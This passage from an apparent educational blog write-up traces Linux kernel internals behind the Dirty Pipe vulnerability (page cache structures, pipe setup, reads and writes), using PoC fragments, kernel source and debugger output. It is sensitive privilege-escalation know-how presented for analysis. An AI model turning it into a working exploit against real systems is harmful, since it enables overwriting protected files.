will allow us to overwrite the cached data of any file that we are allowed to open (read-only access is sufficient), without the page cache actually marking the overwritten page as \u0026lsquo;dirty\u0026rsquo;. Thus, we can trick the system into thinking that the file contents changed (at least for a while) without leaving traces on disk.\nBut let\u0026rsquo;s not get ahead of ourselves, the goal is after all to understand why this happens. As we can see, the first thing our PoC does, is opening a file for reading, without any additional flags.\nint tfd; ... pause_for_inspection(\u0026#34;About to open() file\u0026#34;); tfd = open(\u0026#34;./target_file\u0026#34;, O_RDONLY); ⬀ go to source code The kernel function handling our open user space call is do_sys_openat2(). It attempts to get the file in the desired mode, and if everything succeeds it installs a new file descriptor that is backed by the file and returns it (the file descriptor is just an integer).\nstatic long do_sys_openat2(int dfd, const char __user *filename, struct open_how *how) { struct open_flags op; int fd = build_open_flags(how, \u0026amp;op); struct filename *tmp; ... tmp = getname(filename); ... fd = get_unused_fd_flags(how-\u0026gt;flags); ... struct file *f = do_filp_open(dfd, tmp, \u0026amp;op); // lolcads: maybe follow ... // but don\u0026#39;t get lost ;) ... if (IS_ERR(f)) { // lolcads: e.g. permission checks failed, doesn\u0026#39;t exist... put_unused_fd(fd); fd = PTR_ERR(f); } else { fsnotify_open(f); fd_install(fd, f); } putname(tmp); return fd; // lolcads: breakpoint 1 } ⬀ go to source code Following the call to do_filp_open() bears the danger of getting lost in the jungle of the (virtual) file system. To avoid going down that rabbit hole we place our first breakpoint on the return statement. This gives us the opportunity to find the struct file that is backing the file descriptor our PoC process receives.\nstruct file { ... struct path f_path; struct inode *f_inode; const struct file_operations *f_op; ... struct address_space *f_mapping; ... }; ⬀ go to source code Importantly, the f_mapping field leads us to the struct address_space that represents the page cache object associated to the file. The a_ops field points to implementations of typical operations one might want to perform on a page cache object e.g., reading ahead, marking pages as dirty or writing back dirty pages, and so on.\nstruct address_space { struct inode *host; struct xarray i_pages; ... unsigned long nrpages; pgoff_t writeback_index; const struct address_space_operations *a_ops; unsigned long flags; ... } ⬀ go to source code The actual cached data lies on one or more pages somewhere in physical memory. Each and every page of physical memory is described by a struct page. An extendable array (struct xarray) containing pointers to those page structs can be found in the i_pages field of the struct address_space.\nstruct page { unsigned long flags; ... /* Page cache and anonymous pages */ struct address_space *mapping; pgoff_t index; /* Our offset within mapping. */ ... /* * If the page can be mapped to userspace, encodes the number * of times this page is referenced by a page table. */ atomic_t _mapcount; /* * If the page is neither PageSlab nor mappable to userspace, * the value stored here may help determine what this page * is used for. See page-flags.h for a list of page types * which are currently stored here. */ unsigned int page_type; ... /* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */ atomic_t _refcount; ... /* * On machines where all RAM is mapped into kernel address space, * we can simply calculate the virtual address. On machines with * highmem some memory is mapped into kernel virtual memory * dynamically, so we need a place to store that address. * Note that this field could be 16 bits on x86 ... ;) * * Architectures with slow multiplication can define * WANT_PAGE_VIRTUAL in asm/page.h */ void *virtual; /* Kernel virtual address (NULL if not kmapped, ie. highmem) */ } ⬀ go to source code The last comment gives a hint at how to find the actual page of physical memory described by this struct within the kernel\u0026rsquo;s virtual address space. (The kernel maps all of physical memory into its virtual address space so we know its somewhere. Refer to the documentation for more details.)\n======================================================================================================================== Start addr | Offset | End addr | Size | VM area description ======================================================================================================================== ... ffff888000000000 | -119.5 TB | ffffc87fffffffff | 64 TB | direct mapping of all physical memory (page_offset_base) ... The key to finding the \u0026rsquo;needle in the haystack\u0026rsquo; is another region of the kernel\u0026rsquo;s virtual address space.\nThe sparse vmemmap uses a virtually mapped memory map to optimize pfn_to_page and page_to_pfn operations. There is a global struct page *vmemmap pointer that points to a virtually contiguous array of struct page objects. A PFN is an index to that array and the offset of the struct page from vmemmap is the PFN of that page. source ======================================================================================================================== Start addr | Offset | End addr | Size | VM area description ======================================================================================================================== ... ffffe90000000000 | -23 TB | ffffe9ffffffffff | 1 TB | ... unused hole ffffea0000000000 | -22 TB | ffffeaffffffffff | 1 TB | virtual memory map (vmemmap_base) ffffeb0000000000 | -21 TB | ffffebffffffffff | 1 TB | ... unused hole ... In the debugger we can confirm that the address of the struct page associated to the struct address_space of the target_file our poc process opened indeed lies within this range.\nstruct task_struct at 0xffff888103a71c80 \u0026gt; \u0026#39;pid\u0026#39;: 231 \u0026gt; \u0026#39;comm\u0026#39;: \u0026#34;poc\u0026#34;, \u0026#39;\\000\u0026#39; \u0026lt;repeats 12 times\u0026gt; struct file at 0xffff8881045b0800 \u0026gt; \u0026#39;f_mapping\u0026#39;: 0xffff8881017d9460 \u0026gt; filename: target_file struct address_space at 0xffff8881017d9460 \u0026gt; \u0026#39;a_ops\u0026#39;: 0xffffffff82226ce0 \u0026lt;ext4_aops\u0026gt; \u0026gt; \u0026#39;i_pages.xa_head\u0026#39; : 0xffffea0004156880 \u0026lt;- here! The kernel implements the translation of this address into a position in the contiguous mapping of all physical memory using a series of macros that hide behind a call to lowmem_page_address / page_to_virt .\n#define page_to_virt(x) __va(PFN_PHYS(page_to_pfn(x))) #define page_to_pfn __page_to_pfn #define __page_to_pfn(page) (unsigned long)((page) - vmemmap) // (see .config: CONFIG_SPARSEMEM_VMEMMAP=y) #define vmemmap ((struct page *)VMEMMAP_START) # define VMEMMAP_START vmemmap_base // (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y) #define PFN_PHYS(x) ((phys_addr_t)(x) \u0026lt;\u0026lt; PAGE_SHIFT) #define PAGE_SHIFT 12 #define __va(x) ((void *)((unsigned long)(x)+PAGE_OFFSET)) #define PAGE_OFFSET ((unsigned long)__PAGE_OFFSET) #define __PAGE_OFFSET page_offset_base // (see .config: CONFIG_DYNAMIC_MEMORY_LAYOUT=y) When following the macros, make sure to consider your architecture (e.g., x86) and check for compile time definitions in the .config file of your build (e.g., CONFIG_DYNAMIC_MEMORY_LAYOUT=y). The values of vmemmap_base and page_offset_base are in general effected by KASLR but can be determined at runtime e.g., by using the debugger.\nEquipped with this knowledge, we can script the debugger to do this calculation for us and print the cached data of the file we opened.\nstruct page at 0xffffea0004156880 \u0026gt; virtual: 0xffff8881055a2000 \u0026gt; data: b\u0026#39;File owned by root!\\n\u0026#39;[...]b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; Inspecting the file permissions confirms that we are indeed not allowed to write to it.\n-rw-r--r-- 1 root root 20 May 19 20:15 target_file\nNext, we are going to explore the second kernel subsystem involved in the Dirty Pipe vulnerability.\nPipes (general) Pipes are a unidirectional inter-process communication (IPC) mechanism found in UNIX-like operating systems. In essence, a pipe is a buffer in kernel space that is accessed by processes through file descriptors. Unidirectionality means that there are two types of file descriptors, read and write ones:\nint pipefds[2]; pipe(pipefds); ┌───────────────────┐ write() ---\u0026gt; pipefds[1] │\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;│ pipefds[0] ---\u0026gt; read() └───────────────────┘ Upon creating a pipe the calling process receives both file descriptors, but usually it proceeds by distributing one or both of the file descriptors to other processes (e.g., by fork/cloneing or through UNIX domain sockets) to facilitate IPC. They are, for example, used by shells to connect stdout and stdin of the launched sub-processes.\n$ strace -f sh -c \u0026#39;echo \u0026#34;Hello world\u0026#34; | wc\u0026#39; 2\u0026gt;\u0026amp;1 | grep -E \u0026#34;(pipe|dup2|close|clone|execve|write|read)\u0026#34; ... sh: pipe([3, 4]) = 0 // parent shell creates pipe sh: clone(...) // spawn child shell that will do echo (build-in command) sh: close(4) = 0 // parent shell does not need writing end anymore echo sh: close(3) // close reading end echo sh: dup2(4, 1) = 0 // set stdout equal to writing end echo sh: close(4) // close duplicate writing end echo sh: write(1, \u0026#34;Hello world\\n\u0026#34;, 12) = 12 // child shell performs write to pipe ... sh: clone(...) // spawn child shell that will later execve wc sh: close(3) = 0 // parent shell does not need reading end anymore ... wc sh: dup2(3, 0) = 0 // set stdin equal to reading end wc sh: close(3) = 0 // close duplicate reading end wc sh: execve(\u0026#34;/usr/bin/wc\u0026#34;, [\u0026#34;wc\u0026#34;],...) // exec wc wc: read(0, \u0026#34;Hello world\\n\u0026#34;, 16384) = 12 // wc reads from pipe ... We mostly care about anonymous pipes as seen in the example above but there are also named pipes (see, e.g., here )\nCheck out the excellent book The Linux Programming Interface by Michael Kerrisk, Chapter 44 \u0026ldquo;Pipes and FIFOs\u0026rdquo; for more information and examples.\nPipes (initialization) After opening the target file, our PoC process proceeds by creating a pipe:\nint pipefds[2]; ... pause_for_inspection(\u0026#34;About to create pipe()\u0026#34;); if (pipe(pipefds)) { exit(1); } ⬀ go to source code Let\u0026rsquo;s investigate what the kernel does to provide the pipe functionality.\nOverview Our system call is handled by the kernel function do_pipe2.\nSYSCALL_DEFINE1(pipe, int __user *, fildes) { return do_pipe2(fildes, 0); } ⬀ go to source code static int do_pipe2(int __user *fildes, int flags) { struct file *files[2]; int fd[2]; int error; error = __do_pipe_flags(fd, files, flags); if (!error) { if (unlikely(copy_to_user(fildes, fd, sizeof(fd)))) { fput(files[0]); fput(files[1]); put_unused_fd(fd[0]); put_unused_fd(fd[1]); error = -EFAULT; } else { fd_install(fd[0], files[0]); fd_install(fd[1], files[1]); } } return error; } ⬀ go to source code Here we can see that two integer file descriptors, backed by two distinct files, are created. One for the reading fd[0], and one for the writing fd[1] end of the pipe. The descriptors are also copied from the kernel to user space copy_to_user(fildes, fd, sizeof(fd)), where fildes is the user space pointer we specified with the call to pipe(pipefds) in our PoC.\nFollowing the call to __do_pipe_flags() reveals which data structures the kernel uses to implement our pipe. We summarized the relevant structures and their relationships in the following figure:\n┌──────────────────┐ ┌──────────────────────┐ ┌►│struct pipe_buffer│ ┌────────────────────────┐ ┌──►│struct pipe_inode_info│ │ │... │ ┌───► │struct file │ │ │ │ │ │page = Null │ │ │ │ │ │... │ │ │... │ File desciptor table │ │... │ │ │ │ │ ├──────────────────┤ │ │ │ │ │head = 0 │ │ │struct pipe_buffer│ int fd │ struct file *f │ │f_inode ───────────────┼──┐ │ │ │ │ │... │ ──────────┼───────────────── │ │ │ │ │ │tail = 0 │ │ │page = Null │ ... │ ... │ │fmode = O_RDONLY | ... │ │ ┌─────────────┐ │ │ │ │ │... │ │ │ │ │ ├─►│struct inode │ │ │ring_size = 16 │ │ ├──────────────────┤ pipefd_r │ f_read ──────┘ │... │ │ │ │ │ │ │ │ │ ... │ │ └────────────────────────┘ │ │... │ │ │... │ │ ├──────────────────┤ pipefd_w │ f_write ──────┐ │ │ │ │ │ │ │ │struct pipe_buffer│ │ │ ┌────────────────────────┐ │ │i_pipe ─────┼─┘ │bufs ─────────────────┼──┘ │... │ ... │ ... └───► │struct file │ │ │ │ │ │ │page = Null │ │ │ │ │ │... │ │... │ │... │ │ │... │ │ │ │ └──────────────────────┘ └──────────────────┘ │ │ │ │i_fop ──────┼─┐ │f_inode ───────────────┼──┘ │ │ │ ┌─────────────────────────────────────┐ │ │ │... │ └──►│struct file_operations │ │fmode = O_WRONLY | ... │ └─────────────┘ │ │ │ │ │... │ │... │ │ │ └────────────────────────┘ │read_iter = pipe_read │ │ │ │write_iter = pipe_write │ │ │ │... │ │ │ │splice_write = iter_file_splice_write│ │ │ │... │ └─────────────────────────────────────┘ The two integer file descriptors, representing the pipe in user space, are backed by two struct files that only differ in their permission bits. In particular, they both refer to the same struct inode.\nThe inode (index node) is a data structure in a Unix-style file system that describes a file-system object such as a file or a directory. Each inode stores the attributes and disk block locations of the object\u0026rsquo;s data. File-system object attributes may include metadata (times of last change, access, modification), as well as owner and permission data. [\u0026hellip;] A directory is a list of inodes with their assigned names. The list includes an entry for itself, its parent, and each of its children. source The i_fop field of the inode contains a pointer to a struct file_operations. This structure holds function pointers to the implementations of the various operations that can be performed on the pipe. Importantly, those include the functions the kernel will use to handle a process\u0026rsquo; request to read() or write() the pipe.\nconst struct file_operations pipefifo_fops = { .open = fifo_open, .llseek = no_llseek, .read_iter = pipe_read, .write_iter = pipe_write, .poll = pipe_poll, .unlocked_ioctl = pipe_ioctl, .release = pipe_release, .fasync = pipe_fasync, .splice_write = iter_file_splice_write, }; ⬀ go to source code As stated above, an inode is not limited to describing pipes, and for other file types this field would point to another set of function pointers / implementations.\nThe pipe-specific part of the inode is mostly contained in the struct pipe_inode_info pointed to by the i_pipe field.\n/** * struct pipe_inode_info - a linux kernel pipe * @mutex: mutex protecting the whole thing * @rd_wait: reader wait point in case of empty pipe * @wr_wait: writer wait point in case of full pipe * @head: The point of buffer production * @tail: The point of buffer consumption * @note_loss: The next read() should insert a data-lost message * @max_usage: The maximum number of slots that may be used in the ring * @ring_size: total number of buffers (should be a power of 2) * @nr_accounted: The amount this pipe accounts for in user-\u0026gt;pipe_bufs * @tmp_page: cached released page * @readers: number of current readers of this pipe * @writers: number of current writers of this pipe * @files: number of struct file referring this pipe (protected by -\u0026gt;i_lock) * @r_counter: reader counter * @w_counter: writer counter * @poll_usage: is this pipe used for epoll, which has crazy wakeups? * @fasync_readers: reader side fasync * @fasync_writers: writer side fasync * @bufs: the circular array of pipe buffers * @user: the user who created this pipe * @watch_queue: If this pipe is a watch_queue, this is the stuff for that **/ struct pipe_inode_info { struct mutex mutex; wait_queue_head_t rd_wait, wr_wait; unsigned int head; unsigned int tail; unsigned int max_usage; unsigned int ring_size; #ifdef CONFIG_WATCH_QUEUE bool note_loss; #endif unsigned int nr_accounted; unsigned int readers; unsigned int writers; unsigned int files; unsigned int r_counter; unsigned int w_counter; unsigned int poll_usage; struct page *tmp_page; struct fasync_struct *fasync_readers; struct fasync_struct *fasync_writers; struct pipe_buffer *bufs; struct user_struct *user; #ifdef CONFIG_WATCH_QUEUE struct watch_queue *watch_queue; #endif }; ⬀ go to source code At this point we can get a first idea of how pipes are implemented. On a high level, the kernel thinks of a pipe as a circular array of pipe_buffer structures (sometimes also called a ring). The bufs field is a pointer to the start of this array.\n/** * struct pipe_buffer - a linux kernel pipe buffer * @page: the page containing the data for the pipe buffer * @offset: offset of data inside the @page * @len: length of data inside the @page * @ops: operations associated with this buffer. See @pipe_buf_operations. * @flags: pipe buffer flags. See above. * @private: private data owned by the ops. **/ struct pipe_buffer { struct page *page; unsigned int offset, len; const struct pipe_buf_operations *ops; unsigned int flags; unsigned long private; }; ⬀ go to source code There are two positions in this array: one for writing to (the head) - and one for reading from (the tail) the pipe. The ring_size defaults to 16 and will always be a power of 2, which is why circularity is implemented by masking index accesses with ring_size - 1 (e.g., bufs[head \u0026amp; (ring_size - 1)]). The page field is a pointer to a struct page describing where the actual data held by the pipe_buffer is stored. We will elaborate more on the process of adding and consuming data below. Note that each pipe_buffer has one page associated which means that the total capacity of the pipe is ring_size * 4096 bytes (4KB).\nA process can get and set the size of this ring using the fcntl() system call with the F_GETPIPE_SZ and F_SETPIPE_SZ flags, respectively. Our PoC sets the size of its pipe to a single buffer (4KB / one page) for simplicity.\nvoid setup_pipe(int pipefd_r, int pipefd_w) { if (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) { exit(1); } ... } ⬀ go to source code Code We can also follow the setup of the pipe in the kernel source code. The initialization of the integer file descriptors happens in __do_pipe_flags().\nstatic int __do_pipe_flags(int *fd, struct file **files, int flags) { int error; int fdw, fdr; ... error = create_pipe_files(files, flags); ... fdr = get_unused_fd_flags(flags); ... fdw = get_unused_fd_flags(flags); ... audit_fd_pair(fdr, fdw); fd[0] = fdr; fd[1] = fdw; return 0; ... } ⬀ go to source code The backing files are initialized in create_pipe_files(). We can see that both files are identical up to permissions, contain a reference to the pipe in their private data, and are opened as streams .\nint create_pipe_files(struct file **res, int flags) { struct inode *inode = get_pipe_inode(); struct file *f; int error; ... f = alloc_file_pseudo(inode, pipe_mnt, \u0026#34;\u0026#34;, O_WRONLY | (flags \u0026amp; (O_NONBLOCK | O_DIRECT)), \u0026amp;pipefifo_fops); ... f-\u0026gt;private_data = inode-\u0026gt;i_pipe; res[0] = alloc_file_clone(f, O_RDONLY | (flags \u0026amp; O_NONBLOCK), \u0026amp;pipefifo_fops); ... res[0]-\u0026gt;private_data = inode-\u0026gt;i_pipe; res[1] = f; stream_open(inode, res[0]); stream_open(inode, res[1]); return 0; } ⬀ go to source code The initialization of the common inode structure happens in get_pipe_inode(). We can see that an inode is created and also information for the pipe is allocated and stored such that inode-\u0026gt;i_pipe can later be used to access the pipe from a given inode. Furthermore, inode-\u0026gt;i_fops specifies the implementations used for file operations on a pipe.\nstatic struct inode *get_pipe_inode(void) { struct inode *inode = new_inode_pseudo(pipe_mnt-\u0026gt;mnt_sb); struct pipe_inode_info *pipe; ... inode-\u0026gt;i_ino = get_next_ino(); pipe = alloc_pipe_info(); ... inode-\u0026gt;i_pipe = pipe; pipe-\u0026gt;files = 2; pipe-\u0026gt;readers = pipe-\u0026gt;writers = 1; inode-\u0026gt;i_fop = \u0026amp;pipefifo_fops; // lolcads: see description below /* * Mark the inode dirty from the very beginning, * that way it will never be moved to the dirty * list because \u0026#34;mark_inode_dirty()\u0026#34; will think * that it already _is_ on the dirty list. */ inode-\u0026gt;i_state = I_DIRTY; inode-\u0026gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR; inode-\u0026gt;i_uid = current_fsuid(); inode-\u0026gt;i_gid = current_fsgid(); inode-\u0026gt;i_atime = inode-\u0026gt;i_mtime = inode-\u0026gt;i_ctime = current_time(inode); return inode; ... } ⬀ go to source code Most of the pipe-specific setup happens is alloc_pipe_info(). Here you can see the actual creation of the pipe, not just the inode, but the pipe_buffers / pipe_inode_info-\u0026gt;bufs that hold the content / data of the pipe.\nstruct pipe_inode_info *alloc_pipe_info(void) { struct pipe_inode_info *pipe; unsigned long pipe_bufs = PIPE_DEF_BUFFERS; // lolcads: defaults to 16 struct user_struct *user = get_current_user(); unsigned long user_bufs; unsigned int max_size = READ_ONCE(pipe_max_size); // lolcads: allocate the inode info pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT); ... // lolcads: allocate the buffers with the page references pipe-\u0026gt;bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer), GFP_KERNEL_ACCOUNT); if (pipe-\u0026gt;bufs) { // lolcads: set up the rest of the relevant fields init_waitqueue_head(\u0026amp;pipe-\u0026gt;rd_wait); init_waitqueue_head(\u0026amp;pipe-\u0026gt;wr_wait); pipe-\u0026gt;r_counter = pipe-\u0026gt;w_counter = 1; pipe-\u0026gt;max_usage = pipe_bufs; pipe-\u0026gt;ring_size = pipe_bufs; pipe-\u0026gt;nr_accounted = pipe_bufs; pipe-\u0026gt;user = user; mutex_init(\u0026amp;pipe-\u0026gt;mutex); return pipe; } ... } ⬀ go to source code Debugger We can print a summary of the freshly initialized pipe (after resizing it) by breaking at the end of pipe_fcntl(), which is the handler invoked in the case F_SETPIPE_SZ: of the switch statement inside do_fcntl() .\nstruct pipe_inode_info at 0xffff8881044aec00 \u0026gt; \u0026#39;head\u0026#39;: 0 \u0026gt; \u0026#39;tail\u0026#39;: 0 \u0026gt; \u0026#39;ring_size\u0026#39;: 1 \u0026gt; \u0026#39;bufs\u0026#39;: 0xffff888101f8a180 struct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: NULL \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 0 \u0026gt; \u0026#39;ops\u0026#39;: NULL \u0026gt; \u0026#39;flags\u0026#39;: There\u0026rsquo;s not much to see yet, but we keep this as a reference to see how things evolve over time.\nPipes (reading/writing) Writing After allocating the pipe, the PoC proceeds by writing to it.\nvoid fill_pipe(int pipefd_w) { for (int i = 1; i \u0026lt;= PAGESIZE / 8; i++) { if (i == 1) { pause_for_inspection(\u0026#34;About to perform first write() to pipe\u0026#34;); } if (i == PAGESIZE / 8) { pause_for_inspection(\u0026#34;About to perform last write() to pipe\u0026#34;); } if (write(pipefd_w, \u0026#34;AAAAAAAA\u0026#34;, 8) != 8) { exit(1); } } } ⬀ go to source code By looking at the file operations of a pipe inode we can see that writes to a pipe are handled by pipe_write(). When data is moved across the kernel-user-space boundary (or within the kernel) one frequently encounters vectorized I/O using iov_iter objects. For our purposes we can think of them as buffers but feel free to follow the links to learn more (also this ).\nstatic ssize_t pipe_write(struct kiocb *iocb, struct iov_iter *from) { struct file *filp = iocb-\u0026gt;ki_filp; struct pipe_inode_info *pipe = filp-\u0026gt;private_data; unsigned int head; ssize_t ret = 0; size_t total_len = iov_iter_count(from); ssize_t chars; bool was_empty = false; ... /* * If it wasn\u0026#39;t empty we try to merge new data into * the last buffer. * * That naturally merges small writes, but it also * page-aligns the rest of the writes for large writes * spanning multiple pages. */ head = pipe-\u0026gt;head; was_empty = pipe_empty(head, pipe-\u0026gt;tail); chars = total_len \u0026amp; (PAGE_SIZE-1); if (chars \u0026amp;\u0026amp; !was_empty) { unsigned int mask = pipe-\u0026gt;ring_size - 1; struct pipe_buffer *buf = \u0026amp;pipe-\u0026gt;bufs[(head - 1) \u0026amp; mask]; int offset = buf-\u0026gt;offset + buf-\u0026gt;len; if ((buf-\u0026gt;flags \u0026amp; PIPE_BUF_FLAG_CAN_MERGE) \u0026amp;\u0026amp; offset + chars \u0026lt;= PAGE_SIZE) { ... ret = copy_page_from_iter(buf-\u0026gt;page, offset, chars, from); ... buf-\u0026gt;len += ret; if (!iov_iter_count(from)) goto out; } } for (;;) { ... head = pipe-\u0026gt;head; if (!pipe_full(head, pipe-\u0026gt;tail, pipe-\u0026gt;max_usage)) { unsigned int mask = pipe-\u0026gt;ring_size - 1; struct pipe_buffer *buf = \u0026amp;pipe-\u0026gt;bufs[head \u0026amp; mask]; struct page *page = pipe-\u0026gt;tmp_page; int copied; if (!page) { page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT); ... pipe-\u0026gt;tmp_page = page; } /* Allocate a slot in the ring in advance and attach an * empty buffer. If we fault or otherwise fail to use * it, either the reader will consume it or it\u0026#39;ll still * be there for the next write. */ spin_lock_irq(\u0026amp;pipe-\u0026gt;rd_wait.lock); head = pipe-\u0026gt;head; if (pipe_full(head, pipe-\u0026gt;tail, pipe-\u0026gt;max_usage)) { spin_unlock_irq(\u0026amp;pipe-\u0026gt;rd_wait.lock); continue; } pipe-\u0026gt;head = head + 1; spin_unlock_irq(\u0026amp;pipe-\u0026gt;rd_wait.lock); /* Insert it into the buffer array */ buf = \u0026amp;pipe-\u0026gt;bufs[head \u0026amp; mask]; buf-\u0026gt;page = page; buf-\u0026gt;ops = \u0026amp;anon_pipe_buf_ops; buf-\u0026gt;offset = 0; buf-\u0026gt;len = 0; if (is_packetized(filp)) buf-\u0026gt;flags = PIPE_BUF_FLAG_PACKET; else buf-\u0026gt;flags = PIPE_BUF_FLAG_CAN_MERGE; pipe-\u0026gt;tmp_page = NULL; copied = copy_page_from_iter(page, 0, PAGE_SIZE, from); ... ret += copied; buf-\u0026gt;offset = 0; buf-\u0026gt;len = copied; if (!iov_iter_count(from)) break; } if (!pipe_full(head, pipe-\u0026gt;tail, pipe-\u0026gt;max_usage)) continue; ... } out: ... return ret; } ⬀ go to source code When handling a write() to a pipe, the kernel differentiates between two cases. First it checks if it can append (at least a part of) the data to page of the pipe_buffer that is currently the head of the ring. Whether or not this is possible is decided by three things:\nis the pipe non-empty when we start writing? (implies that there are initialized buffers available)!was_empty is the PIPE_BUF_FLAG_CAN_MERGE flag set?buf-\u0026gt;flags \u0026amp; PIPE_BUF_FLAG_CAN_MERGE is there is enough space left on the page?offset + chars \u0026lt;= PAGE_SIZE If the answer to all of those questions is yes the kernel starts the write by appending to the existing page.\nTo complete the rest of the write the kernel advances the head to the next pipe_buffer, allocates a fresh page for it, initializes the flags (thePIPE_BUF_FLAG_CAN_MERGE flag will be set, unless the user explicitly asked for the pipe to be in O_DIRECT mode), and writes the data to the beginning of the new page. This continues until there is no data left to write (or the pipe is full). Regarding the O_DIRECT mode of pipe():\n[...] O_DIRECT (since Linux 3.4) Create a pipe that performs I/O in \u0026#34;packet\u0026#34; mode. Each write(2) to the pipe is dealt with as a separate packet, and read(2)s from the pipe will read one packet at a time. [...] source This is handled in the if-condition is_packetized(filp) in pipe_write() (see above).\nWe can also see these two types of writes in the debugger. The first write is into an empty pipe and thus initializes our previously zero-filled pipe buffer.\nstruct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea00040e3bc0 \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 8 \u0026gt; \u0026#39;ops\u0026#39;: 0xffffffff8221bb00 \u0026lt;anon_pipe_buf_ops\u0026gt; \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE struct page at 0xffffea00040e3bc0 \u0026gt; virtual: 0xffff8881038ef000 \u0026gt; data: b\u0026#39;AAAAAAAA\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39;[...]b\u0026#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; All subsequent writes go down the \u0026ldquo;append path\u0026rdquo; and fill the existing page.\nstruct pipe_buffer at 0xffff888101f8a180 \u0026gt; \u0026#39;page\u0026#39;: 0xffffea00040e3bc0 \u0026gt; \u0026#39;offset\u0026#39;: 0 \u0026gt; \u0026#39;len\u0026#39;: 4096 \u0026gt; \u0026#39;ops\u0026#39;: 0xffffffff8221bb00 \u0026lt;anon_pipe_buf_ops\u0026gt; \u0026gt; \u0026#39;flags\u0026#39;: PIPE_BUF_FLAG_CAN_MERGE struct page at 0xffffea00040e3bc0 \u0026gt; virtual: 0xffff8881038ef000 \u0026gt; data: b\u0026#39;AAAAAAAAAAAAAAAAAAAA\u0026#39;[...]b\u0026#39;AAAAAAAAAAAAAAAAAAAA\u0026#39; Reading Next, the POC drains the pipe by consuming / reading all the As from the reading end.\nvoid drain_pipe(int pipefd_r) { char buf[8]; for (int i = 1; i \u0026lt;= PAGESIZE / 8; i++) { if (i == PAGESIZE / 8) { pause_for_inspection(\u0026#34;About to perform last read() from pipe\u0026#34;); } if (read(pipefd_r, buf, 8) != 8) { exit(1); } } } ⬀ go to source code The case where a process asks the kernel to read() from a pipe is handled by the function pipe_read().\nstatic ssize_t pipe_read(struct kiocb *iocb, struct iov_iter *to) { size_t total_len = iov_iter_count(to); struct file *filp = iocb-\u0026gt;ki_filp; struct pipe_inode_info *pipe = filp-\u0026gt;private_data; bool was_full, wake_next_reader = false; ssize_t ret; ... ret = 0; __pipe_lock(pipe); /* * We only wake up writers if the pipe was full when we started * reading in order to avoid unnecessary wakeups. * * But when we do wake up writers, we do so using a sync wakeup * (WF_SYNC), because we want them to get going and generate more * data for us. */ was_full = pipe_full(pipe-\u0026gt;head, pipe-\u0026gt;tail, pipe-\u0026gt;max_usage); for (;;) { /* Read -\u0026gt;head with a barrier vs post_one_notification() */ unsigned int head = smp_load_acquire(\u0026amp;pipe-\u0026gt;head); unsigned int tail = pipe-\u0026gt;tail; unsigned int mask = pipe-\u0026gt;ring_size - 1; ... if (!pipe_empty(head, tail)) { struct pipe_buffer *buf = \u0026amp;pipe-\u0026gt;bufs[tail \u0026amp; mask]; size_t chars = buf-\u0026gt;len; size_t written; int error; if (chars \u0026gt; total_len) { ... chars = total_len; } ... written = copy_page_to_iter(buf-\u0026gt;page, buf-\u0026gt;offset, chars, to); ... ret += chars; buf-\u0026gt;offset += chars; buf-\u0026gt;len -= chars; ... if (!buf-\u0026gt;len) { pipe_buf_release(pipe, buf); ... tail++; pipe-\u0026gt;tail = tail; ... } total_len -= chars; if (!total_len) break; /* common path: read succeeded */ if (!pipe_empty(head, tail)) /* More to do? */ continue; } if (!pipe-\u0026gt;writers) break; if (ret) break; if (filp-\u0026gt;f_flags \u0026amp; O_NONBLOCK) { ret = -EAGAIN; break; } ... } ... if (ret \u0026gt; 0) file_accessed(filp); return ret; } ⬀ go to source code If the pipe is non-empty, the data is taken from the tail-indexed pipe_buffer (in bufs). In case, a buffer is emptied during a read, the release function pointer of the ops field of the pipe_buffer is executed. For a pipe_buffer that was initialized by an earlier write(), the ops field is a pointer to the struct pipe_buf_operations anon_pipe_buf_ops.\nstatic const struct pipe_buf_operations anon_pipe_buf_ops = { .release = anon_pipe_buf_release, .try_steal = anon_pipe_buf_try_steal, .get = generic_pipe_buf_get, }; ⬀ go to source code /** * pipe_buf_release - put a reference to a pipe_buffer * @pipe: the pipe that the buffer belongs to * @buf: the buffer to put a reference to */ static inline void pipe_buf_release(struct pipe_inode_info *pipe, struct pipe_buffer *buf) { const struct pipe_buf_operations *ops = buf-\u0026gt;ops; buf-\u0026gt;ops = NULL; ops-\u0026gt;release(pipe, buf); } ⬀ go to source code static void anon_pipe_buf_release(struct pipe_inode_info *pipe, struct pipe_buffer *buf) { struct page *page = buf-\u0026gt;page; /* * If nobody else uses this page, and we don\u0026#39;t already have a * temporary page, let\u0026#39;s keep track of it as a one-deep * allocation cache. (Otherwise just release our reference to it) */ if (page_count(page) == 1 \u0026amp;\u0026amp; !pipe-\u0026gt;tmp_page) pipe-\u0026gt;tmp_page = page; else put_page(page); } ⬀ go to source code Thus, anon_pipe_buf_release() is executed, which calls put_page() to release our reference to the page. Note that while the ops pointer is set to NULL to signal that be buffer has been released, the page and flags fields of the pipe_buffer are left unmodified. It is thus the responsibility of code that might reuse a pipe buffer to initialize all its fields, otherwise the values are \u0026ldquo;uninitialized\u0026rdquo;. We can confirm this by printing the pipe structures after the last read.\nstruct 